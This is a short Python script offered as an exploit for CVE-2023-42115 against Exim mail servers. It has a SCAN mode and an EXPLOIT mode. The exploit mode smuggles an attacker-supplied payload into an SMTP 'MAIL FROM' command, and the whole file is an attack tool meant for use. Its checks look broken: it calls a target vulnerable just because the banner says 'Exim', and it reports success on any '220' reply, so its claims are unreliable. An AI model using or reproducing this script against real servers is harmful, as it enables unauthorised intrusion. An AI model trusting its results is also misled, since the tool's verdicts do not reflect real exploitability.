import argparse
import socket
import sys

# Define color codes
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

def print_banner():
    banner = "Exploit CVE-2023-42115 / Creat by Isotaka-Nobomaro {contact@isotakanobomaro.work.gd}"
    width = 100
    print(f"\n{GREEN}{'=' * width}{RESET}")
    print(f"{GREEN}{banner.center(width)}{RESET}")
    print(f"{GREEN}{'=' * width}{RESET}\n")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Exploit CVE-2023-42115 Vulnerability")
    parser.add_argument('-t', '--target', required=True, help="The IP address of the target service.")
    parser.add_argument('-p', '--port', type=int, default=25, help="The port on which the target service is running (default: 25).")
    parser.add_argument('-m', '--mode', choices=['SCAN', 'EXPLOIT'], required=True, help="The mode of operation: SCAN or EXPLOIT.")
    parser.add_argument('-f', '--payload-file', help="Path to the file containing the payload (only required for EXPLOIT mode).")
    return parser.parse_args()

def connect_to_target(target_ip, target_port):
    try:
        sock = socket.create_connection((target_ip, target_port))
        return sock
    except Exception as e:
        print(f"Error connecting to {target_ip}:{target_port} - {e}")
        sys.exit(1)

def send_command(sock, command):
    sock.sendall(command.encode('utf-8'))
    response = sock.recv(4096).decode('utf-8')
    return response

def check_vulnerability(sock):
    response = send_command(sock, "EHLO test\r\n")
    if "Exim" in response:
        return True
    return False

def exploit_vulnerability(sock, payload_file):
    if not payload_file:
        print("Error: Payload file must be specified for EXPLOIT mode.")
        sys.exit(1)

    try:
        with open(payload_file, 'r') as file:
            payload = file.read()
    except Exception as e:
        print(f"Error reading payload file: {e}")
        sys.exit(1)

    payload_command = f"MAIL FROM:<;{payload};>\r\n"
    response = send_command(sock, payload_command)
    return response

def main():
    print_banner()
    args = parse_arguments()
    sock = connect_to_target(args.target, args.port)
    
    if args.mode == 'SCAN':
        print("Checking target for CVE-2023-42115...")
        if check_vulnerability(sock):
            print(f"{GREEN}Target appears to be vulnerable.{RESET}")
        else:
            print(f"{RED}Target does not appear to be vulnerable.{RESET}")
    elif args.mode == 'EXPLOIT':
        print("Attempting to exploit target...")
        response = exploit_vulnerability(sock, args.payload_file)
        print("Response received:")
        print(response)
        if "220" in response:
            print(f"{GREEN}Exploitation successful!{RESET}")
        else:
            print(f"{RED}Exploitation failed or target is not vulnerable.{RESET}")
    
    sock.close()

if __name__ == "__main__":
    main()
